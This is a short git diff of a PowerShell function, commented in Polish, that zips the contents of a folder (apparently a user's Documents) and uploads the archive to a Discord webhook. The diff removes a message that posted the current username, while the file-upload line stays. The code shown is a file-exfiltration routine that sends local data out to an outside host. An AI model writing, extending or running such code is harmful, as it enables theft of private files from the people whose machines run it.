@@ -24,14 +24,6 @@ function Upload-ZippedFilesToDiscord {
     # Kompresowanie plików i folderów do pliku .zip
     Compress-Archive -Path "$folderPath\*" -DestinationPath $zipPath
 
-    $Body = @{
-        'username' = $env:USERNAME
-        'content'  = "Uploading zipped files: Documents.zip"
-    }
-
-    # Wysyłanie wiadomości tekstowej na Discord
-    Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)
-
     # Wysyłanie pliku .zip na Discord
     Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $zipPath -Headers @{ 'Content-Type' = 'multipart/form-data' }
 }
